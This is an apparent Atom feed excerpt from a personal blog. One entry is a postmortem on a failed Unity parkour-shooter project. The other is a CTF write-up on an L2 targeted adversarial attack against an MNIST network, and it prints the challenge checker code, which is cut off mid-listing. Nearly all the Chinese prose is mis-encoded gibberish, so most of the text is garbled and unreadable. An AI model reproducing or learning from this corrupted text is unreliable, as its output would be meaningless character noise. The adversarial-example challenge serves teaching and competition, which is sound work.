    <content type="html"><![CDATA[<p>æœ¬æ¥æƒ³åœ¨ä¹‹å‰Uncertaintyçš„åŸºç¡€ä¸Šæ‹“å±•å‡ºä¸€ä¸ªç±»ä¼¼Ghost Runnerçš„è·‘é…·å°„å‡»æ¸¸æˆï¼Œå¾ˆæ˜¾ç„¶å¼€å§‹å†™è¿™ä¸ªæ–‡é‚£è‚¯å®šæ˜¯å·²ç»Failedå˜ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½è¯´åƒä¸€å ‘é•¿ä¸€æ™ºå§ï¼Œå¸Œæœ›æˆ‘å·²ç»ä»æ„šæ˜§å±±å³°æ‰åˆ°äº†emoä¹‹è°·ï¼ˆå¿˜äº†é‚£ä¸ªç©æ„å„¿å«å•¥äº†ï¼‰</p><p>ä»¥ä¸‹ç®€å•è¯´æ˜ä¸€ä¸‹ä¸ºä»€ä¹ˆæœ€åä»£ç å’Œå·¥ç¨‹åšä¸ä¸‹å»å˜ï¼Œå°±æ˜¯ä¸ªè‡ªæˆ‘åçœï¼Œå¯èƒ½æ²¡å•¥å¹²è´§</p><span id="more"></span><!--toc--><h1 id="æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§"><a href="#æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§" class="headerlink" title="æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§"></a>æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§</h1><h2 id="GDD"><a href="#GDD" class="headerlink" title="GDD"></a>GDD</h2><p>è¯´å®è¯è¿™æ¬¡ç»§ç»­æ‹“å±•è¿™ä¸ªæ¸¸æˆå°±åªçŸ¥é“æˆ‘ä»¬è¦åšçš„æ˜¯ä¸ªè·‘é…·æ‰“æªçš„æ¸¸æˆï¼Œè€Œå¯¹äºå…³å¡è®¾è®¡ï¼Œæ˜¯å¦å…·æœ‰å¯ç©æ€§ï¼ŒèƒŒåçš„å¾ˆå¤šè®¾å®šï¼Œç¾æœ¯é£æ ¼ï¼Œéƒ½æ˜¯ä¸€è¾¹åšä¸€è¾¹å†³å®šçš„</p><p>æˆ‘åªèƒ½è¯´è¾¹åšè¾¹å®šè¿™ç§è¡Œä¸ºå¯¹äºå°å›¢é˜Ÿå°é¡¹ç›®æ¥è¯´æ˜¯å®Œå…¨é€‚ç”¨çš„ï¼Œå°¤å…¶æ˜¯å¯¹äºä¸€ä¸ªåƒæˆ‘ä¸€æ ·çš„Noobï¼Œå› ä¸ºè®©ä¸€ä¸ªæ²¡æ€ä¹ˆç³»ç»Ÿæ€§åšè¿‡æ¸¸æˆçš„å‡†Beginneræ¥ç€æ‰‹GDDï¼Œå¯èƒ½ä¼šå¯¼è‡´è®¡åˆ’çš„å†…å®¹è¿‡äºæŠ½è±¡å’Œè„±ç¦»å®é™…ï¼Œå”¯ä¸€èƒ½å¤Ÿè´¡çŒ®çš„ä¹Ÿå°±ä¸€ä¸ªæŒ‡å¯¼æ„ä¹‰äº†ï¼Œä½†ç›´æ¥å¼€å§‹åšï¼Œè¾¹åšè¾¹è§£å†³é—®é¢˜ï¼Œè™½ç„¶ç¬¬ä¸€æ¬¡åšå‡ºæ¥çš„ä¸œè¥¿ä¼šåˆ°å¤„éƒ½æ˜¯ä¸åˆç†çš„åœ°æ–¹ï¼Œä½†æœ€é‡è¦çš„æ˜¯è®©å®è·µè€…çŸ¥é“äº†åœ¨å®æ“ä¸­å¯èƒ½é‡åˆ°çš„å›°éš¾å’Œå·²ç»æ‹¥æœ‰çš„æŠ€æœ¯èƒ½åŠ›ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡åšæ¸¸æˆçš„æ—¶å€™å°±å¯ä»¥å°è¯•å¼€å§‹GDDäº†ï¼Œç„¶åæ¯æ¬¡æŠŠæ¸¸æˆåšå¤§ä¸€ç‚¹ç‚¹ï¼Œæ¯æ¬¡åšä¹‹å‰æŠŠä¸åˆç†çš„åœ°æ–¹è¿›è¡Œé‡æ„é‡å†™ï¼Œå°±å¯ä»¥åšå‡ºæ›´åŠ åˆç†çš„ä¸œè¥¿äº†ï¼ˆè€Œä¸æ˜¯åƒæ˜¯åœ¨å †ä¸€åº§å±å±±</p><p>æ€»ç»“å°±æ˜¯ï¼šåšç¬¬ä¸€ä¸ªæ¸¸æˆæœ€å¥½åˆ«å¼„ä»€ä¹ˆGDDï¼Œæ”¾æ‰‹å»åšå°±è¡Œï¼Œç„¶åä¹Ÿåˆ«å¤ªæœ‰é‡å¿ƒï¼Œå°±å°½é‡åšç›´åˆ°è‡ªå·±è§‰å¾—è¿™å±å±±ä»£ç ä¸é‡æ„ä¸€ä¸‹çœŸçš„å†™ä¸ä¸‹å»çš„æ—¶å€™ï¼Œå°±å¼€ç¬¬äºŒä¸ªæ¸¸æˆçš„å‘ã€‚åœ¨ç¬¬äºŒä¸ªæ¸¸æˆä¸­ä»»ä½•ä¸€è¡Œä»£ç ä¹‹å‰å…ˆæ•²å®šGDDï¼Œå¹¶å¤§æ¦‚è§„åˆ’ä¸€ä¸‹å„ä¸ªåˆ¶ä½œç¯èŠ‚ã€åˆ¶ä½œé˜¶æ®µçš„å‘¨æœŸï¼Œè®¡åˆ’å¥½äº†å†åšäº‹ï¼Œä¸ç„¶å¾ˆå®¹æ˜“Spaghetti Code</p><p>ï¼ˆæ‰€ä»¥è¿™ä¹ˆæ¥è¯´ï¼Œè™½ç„¶è¯´Uncertaintyæ˜¯åšçš„ç¬¬ä¸€ä¸ªæ¸¸æˆï¼Œä½†æ˜¯è¯´å®è¯å¹¶æ²¡æœ‰è§‰å¾—â€åšä¸ä¸‹å»äº†â€œï¼Œè€Œåœ¨è¿™ä¸ªæ–°çš„æ‹“å±•ä¸­å´æœ‰è¿™ç§æ„Ÿè§‰ï¼Œè¯´æ˜ç“¶é¢ˆæ˜¯ç°åœ¨æ‰æœ‰çš„ï¼Œé‚£å°±åœ¨ä¸‹ä¸€ä¸ªæ¸¸æˆå¼€å§‹æ³¨æ„è¿™äº›äº†å—¯</p><h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><p>åœ¨æ­£å¼åŠ¨å·¥ä¹‹å‰ï¼Œè¦ç°æ ¹æ®GDDå¯¹æ•´ä½“æ¶æ„è¿›è¡Œå¤§æ¦‚çš„é¢…å†…codingï¼Œæ¯”å¦‚ç±»ä¸ç±»çš„ç»§æ‰¿å…³ç³»ï¼Œä¸€ä¸ªç»§æ‰¿<code>Monobehaviour</code>çš„ç±»ä¸­çš„å“ªäº›å†…å®¹å¯ä»¥è¢«æŠ½è±¡å‡ºæ¥ä½œä¸ºä¸€ä¸ªæ›´ä¸ºGenericçš„ç±»ï¼Œè¦å‡†å¤‡å“ªäº›æ¥å£ï¼Œè¦å¦‚ä½•æ„å»ºEvent Systemç­‰ç­‰ã€‚è¯´å®è¯æˆ‘ç°åœ¨å†™è¿™ä¸ªçš„æ—¶å€™æˆ‘éƒ½è¿˜æ²¡æœ‰å¤ªç†è§£åˆ°åº•æ€æ ·æ‰èƒ½åšåˆ°ä¸€ä¸ªä¼˜ç§€çš„æ¶æ„ï¼Œç­‰æˆ‘ä»¥åçœŸçš„ä¼šåšè¿™äº›å·¥ä½œäº†æˆ‘å†å‘ä¸€ç¯‡æ–‡ç†ä¸€ä¸‹ï¼Œä½†è‡³å°‘å¤šèŠ±ç‚¹æ—¶é—´åœ¨ç€æ‰‹codingå‰çš„è®¾è®¡ä¸Šï¼Œèƒ½è®©ä½ åœ¨å®é™…codingä¸­å°‘å¾ˆå¤šé¡¾è™‘ï¼Œå¹¶ä¸”å¯¹è‡ªå·±çš„codeæ›´æœ‰åº•æ°”ï¼ˆæˆ‘è¿™æ¬¡å°±å†™äº†å¾ˆå¤šæ²¡åº•æ°”çš„codeï¼Œæ¯”å¦‚æˆ‘æœ‰äº›æ—¶å€™è§‰å¾—â€œå¥½åƒè¿™äº›codeä¸è¯¥å†™è¿›è¿™ä¸ªç±»å•Šâ€¦â€ï¼Œä½†æ˜¯å› ä¸ºå›¾æ–¹ä¾¿ä»¥åŠç¡®å®ä¸å¤ªæ¸…æ¥šè¦æ€ä¹ˆåšæ‰æ˜¯æ­£ç¡®çš„ï¼Œå¯¼è‡´ä»£ç è¶Šå†™è¶Šä¹±ï¼Œè¶Šå†™è¶Šéš¾å—ï¼Œç›´åˆ°å®Œå…¨å¼€æ‘†ï¼Œç±»ä¸ç±»ä¹‹é—´çš„å…³ç³»ä¹±åˆ°å‘æŒ‡</p><p>å› ä¸ºæ˜¯åœ¨Unityå¼•æ“åŸºç¡€ä¸Šåšæ¸¸æˆï¼Œåªéœ€è¦è€ƒè™‘æ¸¸æˆæœ¬èº«çš„æ¶æ„ï¼Œæ‰€ä»¥å…¶å®å·²ç»å¾ˆè¡¨å±‚äº†ï¼Œä¹‹å‰çš„Uncertaintyå› ä¸ºç»“æ„ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤æ‚çš„è¦ç´ ï¼Œæ‰€ä»¥åšèµ·æ¥å…¶å®æ ¹æœ¬ä¸éœ€è¦ä»€ä¹ˆæ¶æ„ï¼Œä¸€ç›´å †ä»£ç å°±å®Œäº‹äº†ï¼Œä»£ç å±‚é¢ä¸Šéƒ½æ²¡æ€ä¹ˆç”¨æ¥å£ç»§æ‰¿è™šå‡½æ•°ä¹‹ç±»çš„ä¸œè¥¿ï¼Œç»“æ„éå¸¸â€å¹³é¢â€œï¼Œé€»è¾‘ä¸Šåªæœ‰å‡ ä¸ªæŒ‰é’®å‡ ä¸ªé—¨æ¥åšä¸€äº›ç®€å•çš„äº¤äº’ï¼ŒEventçš„ç®¡ç†ä¸Šä¹Ÿéå¸¸å¹³é¢ï¼Œè¿‡äºç®€å•</p><p>ä½†æ˜¯å½“æˆ‘ä»¬æƒ³è¦å¢åŠ ä¸€ç‚¹NPCï¼Œä¸€äº›æ•Œäººçš„æ—¶å€™ï¼Œå°±å‘ç°éœ€è¦åšçš„å·¥ä½œè¿˜å·®çš„å¾ˆå¤šäº†ï¼Œé¦–å…ˆåœ¨ä¸€å¼€å§‹å› ä¸ºPlayerä¸éœ€è¦ç”Ÿå‘½å€¼ï¼Œæ‰€ä»¥åæ¥åŠ äº†ä¸€ä¸ªEntityç±»æ¥Deriveå‡ºå…·æœ‰ç”Ÿå‘½å€¼çš„ç‰©ä½“ï¼Œ</p><h2 id="OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€"><a href="#OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€" class="headerlink" title="OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€"></a>OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€</h2><p>ä¸å¾—ä¸è¯´OOPå¯¹æˆ‘è¿˜è¯´è¿˜ä»ç„¶æ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯â€œæˆ‘è„‘å­éƒ½æ˜ç™½è¿™äº›å…³é”®å­—ã€è¿™äº›æ“ä½œæ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä¹ŸçŸ¥é“ä»–ä»¬ä¹‹é—´çš„é€»è¾‘å…³ç³»â€ï¼Œä½†æˆ‘æœ‰äº›æ—¶å€™å°±æ˜¯ä¸èƒ½<strong>åˆç†</strong>åœ°å¤„ç†ä»–ä»¬åœ¨å®é™…è¿ç”¨åœºæ™¯ä¸­çš„å…³ç³»</p><p>è¯­è¨€åŸºç¡€åº”è¯¥ä¹Ÿæ˜¯å¯¼è‡´OOPä¸ç†Ÿçš„ä¸€ä¸ªåŸå› ï¼Œæˆ‘ä¸€å¼€å§‹å¯¹äºæ¥å£ã€è™šå‡½æ•°ã€é‡å†™ã€eventä¹‹ç±»çš„å…³é”®çš„è¦ç´ äº†è§£å’Œåº”ç”¨å¤ªå°‘ï¼Œå¯¼è‡´åŸºç¡€ä¸ç‰¢å›ºï¼Œè‡³äºè¦ç†Ÿæ‚‰è¿™äº›å†…å®¹ï¼Œé‚£æœ€å¥½å¤šåšä¸€äº›å·¥å…·åŒ–çš„å®ç°ï¼Œæ¯”å¦‚èƒŒåŒ…ç³»ç»Ÿå•Šï¼Œæˆ–è€…å®è·µä¸€äº›NPCçš„AIç³»ç»Ÿå•Šä»€ä¹ˆçš„ï¼Œä½†å…³é”®éƒ½æ˜¯åšå®Œä¹‹åè¦å°½å¯èƒ½è§£è€¦ï¼Œå¹¶å°½åŠ›ä¿è¯æŠ½è±¡å‡ºæ¥çš„ç³»ç»Ÿçš„é€šç”¨æ€§</p><h2 id="ä¹‹åçš„è§„åˆ’"><a href="#ä¹‹åçš„è§„åˆ’" class="headerlink" title="ä¹‹åçš„è§„åˆ’"></a>ä¹‹åçš„è§„åˆ’</h2><p>èŠ±äº†ä¸€ä¸ªå¤šæœˆå»è¯•ç€åœ¨ä¹‹å‰åšè¿‡çš„æ¸¸æˆçš„åŸºç¡€ä¸Šç»§ç»­åšä¸ªæ¸¸æˆä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯è‡ªå·±çš„é—®é¢˜ï¼Œè‡³å°‘ç°åœ¨å¯¹å¾ˆå¤šä¸œè¥¿çš„åº”ç”¨åœºæ™¯æœ‰æ›´æ·±çš„ç†è§£äº†ï¼Œä¹Ÿè¿˜æ˜¯æ–°å­¦äº†ä¸å°‘å†…å®¹çš„implement</p><p>ç°åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å±äºæ˜¯é©¬ä¸Šå°±è¦æœŸæœ«äº†ï¼Œæ‰€ä»¥å¾—æ»šå»å¤ä¹ å’Œèµ¶ä½œä¸šçš„DDLäº†</p><p>å‡æœŸå°½é‡åšäº›æ¸¸æˆå¼•æ“åº•å±‚çš„ä¸œè¥¿æ“ä¸ªMCï¼ˆè²Œä¼¼æ¥è§¦åº•å±‚å…ˆæ“MCæ˜¯ä¸ªæ¯”è¾ƒæ™®éçš„HelloWorldï¼‰ï¼Œå¸Œæœ›èƒ½ç”¨ä¸Šè¿™å­¦æœŸï¼ˆè™½ç„¶æœ‰è¯¾ä½†çº¯é è‡ªï¼‰å­¦çš„OS</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ¥æƒ³åœ¨ä¹‹å‰Uncertaintyçš„åŸºç¡€ä¸Šæ‹“å±•å‡ºä¸€ä¸ªç±»ä¼¼Ghost Runnerçš„è·‘é…·å°„å‡»æ¸¸æˆï¼Œå¾ˆæ˜¾ç„¶å¼€å§‹å†™è¿™ä¸ªæ–‡é‚£è‚¯å®šæ˜¯å·²ç»Failedå˜ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½è¯´åƒä¸€å ‘é•¿ä¸€æ™ºå§ï¼Œå¸Œæœ›æˆ‘å·²ç»ä»æ„šæ˜§å±±å³°æ‰åˆ°äº†emoä¹‹è°·ï¼ˆå¿˜äº†é‚£ä¸ªç©æ„å„¿å«å•¥äº†ï¼‰&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹ç®€å•è¯´æ˜ä¸€ä¸‹ä¸ºä»€ä¹ˆæœ€åä»£ç å’Œå·¥ç¨‹åšä¸ä¸‹å»å˜ï¼Œå°±æ˜¯ä¸ªè‡ªæˆ‘åçœï¼Œå¯èƒ½æ²¡å•¥å¹²è´§&lt;/p&gt;</summary>
    
    
    
    <category term="Unity" scheme="https://kyriota.github.io/categories/Unity/"/>
    
    
  </entry>
  
  <entry>
    <title>L2 Targeted Attack</title>
    <link href="https://kyriota.github.io/2022/04/09/L2_Targeted_Attack/"/>
    <id>https://kyriota.github.io/2022/04/09/L2_Targeted_Attack/</id>
    <published>2022-04-08T17:57:20.000Z</published>
    <updated>2022-08-02T06:50:05.842Z</updated>
    
    <content type="html"><![CDATA[<p>ç»ˆäºæ˜¯æŠŠè¿™ç©æ„å„¿è‡ªå·±å®ç°äº†ä¸€éï¼Œæ°é€¢miniL CTFï¼Œè¿™æ–‡ç« è™½ç„¶æ˜¯22.04.09å†™çš„ï¼Œä½†æ˜¯ä¼°è®¡åšå®¢å¾—ç­‰åˆ°äº”æœˆå¤šæ‰ä¼šæ›´æ–°ï¼Œå±Šæ—¶å°†ä¹Ÿå†è¡¥å……ä¸€äº›åœ¨miniL CTFä¸­æœ¬é¢˜çš„æƒ…å†µ</p><span id="more"></span><h1 id="L2-Targeted-Attack"><a href="#L2-Targeted-Attack" class="headerlink" title="L2 Targeted Attack"></a>L2 Targeted Attack</h1><p><strong>å‰ç½®çŸ¥è¯†ï¼š<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">å…¨è¿æ¥ç¥ç»ç½‘ç»œ</a></strong></p><p><strong>å‚è€ƒæ–‡çŒ®ï¼š<a href="https://arxiv.org/abs/1608.04644">Towards Evaluating the Robustness</a></strong></p><blockquote><p>ç¢ç¢å¿µï¼šè¿™æ®µæ—¶é—´åˆåœ¨æ£é¼“<a href="https://kyriota.com/2021/11/17/Uncertainty/">Uncertainty</a>ï¼ŒåŠ ç‚¹å†…å®¹æƒ³å»å‚åŠ å‰æ¯”ç‰¹çš„Jamï¼Œç­‰Jamå®Œäº†å¯èƒ½çš„ç ”ç©¶å¯¹è±¡åº”è¯¥æ˜¯CNNï¼ŒUE5ä¹‹ç±»çš„ï¼ˆç¥ç»ç»†èƒè‡ªåŠ¨æœºæš‚æ—¶å°±å…ˆé¸½äº†ï¼Œä½†ç¡®å®å¾ˆæœ‰è¶£ï¼Œä»¥ååº”è¯¥å›å»çœ‹çœ‹çš„</p></blockquote><h2 id="miniL-CTF"><a href="#miniL-CTF" class="headerlink" title="miniL CTF"></a>miniL CTF</h2><p>æœ‰å¹¸åœ¨æ ¡å†…çš„miniL CTFå‡ºä¸€æ¬¡é¢˜ï¼ˆä¸€ä¸ªL2TargetedAttackï¼Œä¸€ä¸ªCheatEngineæ”¹åæ ‡ï¼‰ï¼Œæœ¬æ¥æƒ³åšä¸€ä¸ªCNNçš„L2 Targeted Attackï¼Œè¿™æ ·å¯ä»¥æŠŠæƒ…æ™¯åŒ…è£…å¾—æœ‰è¶£ä¸€äº›ï¼Œä½†æ˜¯è¿˜æ˜¯å¤ªæ‡’äº†ï¼Œå¼„å®Œè¿™ä¸ªå°±ä¸æƒ³å¼„CNNäº†ï¼Œå°±å…ˆå‡ºåˆ°è¿™é‡Œäº†</p><p>é¢˜ç›®åä¸º<code>NEXT</code>ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è®©ä½ å¯¹MNISTä¸­çš„å‡ ä¸ªSamplesåŠ æ‰°åŠ¨ï¼Œä½¿å¾—å¦‚ä¸‹çš„8ä¸ªSamplesè¢«æ¨¡å‹è¯†åˆ«æˆå…¶åŸæœ¬lableçš„ä¸‹ä¸€ä¸ªæ•°ï¼Œå¦‚1â†’2ï¼Œ2â†’3â€¦</p><p>ä¸ºäº†è®©é¢˜ç›®æœ‰ä¸ªæƒ…æ™¯ï¼Œæ‰€ä»¥æŠŠåŸæœ¬çš„weightç»™è½®äº†ä¸€ä¸‹é¡ºåºï¼ŒåŸlableæœ¬åº”æ˜¯[0,1,2,3,4,5,6,7,8,9]ï¼Œè¢«æ”¹æˆäº†[1,2,3,4,5,6,7,8,9,0]ï¼Œäºæ˜¯ä¹é¢˜ç›®å°±æœ‰äº†ä¸€ä¸ªè™½ç„¶ä¸åˆç†ä½†å¯ä»¥å¿½æ‚ äººçš„æƒ…æ™¯</p><img src="/images/L2TarAtt_Original.png"><p>æ¨¡å‹ä¸ºå¸¦DropOutçš„FCNNï¼Œè™½ç„¶å¸¦DropOutï¼Œä½†æ˜¯æ•´ä½“æ¢¯åº¦æ¯”è¾ƒæ˜æ˜¾ï¼Œå¯¹æ‰°åŠ¨çš„é²æ£’æ€§æ¬ ä½³ï¼Œå¾ˆé€‚åˆä½œä¸ºæ”»å‡»å¯¹è±¡</p><p>æºç ä¸Šå¯¹åŸæœ¬çš„å‡½æ•°åšäº†ä¸€ç‚¹æ··æ·†ï¼Œæ¯”å¦‚<code>softMax</code>ç¼©å†™æˆ<code>SM</code>ä¹‹ç±»çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†é€‰æ‰‹æ·±å…¥äº†è§£ç¥ç»ç½‘ç»œä¹‹åå†å…¥æ‰‹é¢˜ç›®ï¼Œä¸è¦åº•å±‚æ²¡æ‘¸æ¸…æ¥šåšçº¯çº¯çš„TFboy</p><p>é™åˆ¶äº†L2å’ŒLinfçš„å¤§å°ï¼Œæ˜¯ä¸ºäº†è®©åšé¢˜äººæ˜ç¡®è¿™æ˜¯ä¸€ä¸ªL2 Attack</p><p>taskä¸­ä¸åŒ…å«<code>torch</code>ï¼Œ<code>TF</code>ä¹‹ç±»çš„ï¼Œä½†å¯ä»¥æŠŠweightæ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹ï¼Œç„¶åä½¿ç”¨å¦‚<code>tf.gradientTape</code>ä¹‹ç±»çš„æ–¹æ³•è‡ªåŠ¨æ±‚æ¢¯åº¦ï¼Œæˆ‘è‡ªå·±è§£æ˜¯ç”¨æ¯”è¾ƒåœŸçš„æ‰‹æ“<code>BackProp</code></p><p><a href="https://kyriota.com/html/DLfiles/NEXT_ALL.zip">ä¸‹è½½é¢˜ç›®åŠexp</a></p><p>ä»¥ä¸‹æ˜¯é¢˜ç›®ä»£ç </p><div class='spoiler collapsed'>    <div class='spoiler-title'>        task.py    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">L2CONSTRAIN = <span class="number">5.6789</span></span><br><span class="line">LINFCONSTRAIN = <span class="number">1.234</span></span><br><span class="line">CONFIDENCE = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RL</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SM</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AB</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ANN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, uNum</span>):</span></span><br><span class="line">        self.uNum = uNum</span><br><span class="line">        self.lNum = <span class="built_in">len</span>(uNum)</span><br><span class="line">        self.w = [<span class="number">0</span>]</span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FP</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.lNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[i])</span><br><span class="line">            self.A.append(RL(self.Z[-<span class="number">1</span>]))</span><br><span class="line">        self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[-<span class="number">1</span>])</span><br><span class="line">        self.A.append(SM(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRED</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.FP()</span><br><span class="line">        <span class="keyword">return</span> np.array(self.A[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LOAD</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(fileName, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.uNum)):</span><br><span class="line">            data = wt[: (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]]</span><br><span class="line">            shape = (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.uNum[i])</span><br><span class="line">            self.w.append(np.matrix(data).reshape(shape))</span><br><span class="line">            wt = wt[(self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHECK</span>(<span class="params">mask: np.matrix, myNN: ANN, x</span>):</span></span><br><span class="line">    l2 = np.<span class="built_in">sum</span>(np.linalg.norm(np.array(mask), axis=<span class="number">1</span>)) / <span class="number">8</span></span><br><span class="line">    linf = np.<span class="built_in">max</span>(np.linalg.norm(np.array(mask), <span class="built_in">ord</span>=np.inf, axis=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> l2 &gt; L2CONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge L2 &quot;</span> + <span class="built_in">str</span>(l2))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> linf &gt; LINFCONSTRAIN:</span><br><span class="line">        print(<span class="string">&quot;Huge Linf&quot;</span> + <span class="built_in">str</span>(linf))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    res = myNN.PRED(x + mask)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        lable = np.argmax(res[i])</span><br><span class="line">        <span class="keyword">if</span> lable != i + <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">&quot;Wrong Lable &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> res[i][lable] &lt; CONFIDENCE:</span><br><span class="line">            print(<span class="string">&quot;Unconfident &quot;</span> + <span class="built_in">str</span>(lable) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="built_in">str</span>(res[i][lable]))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uNum = [<span class="number">784</span>, <span 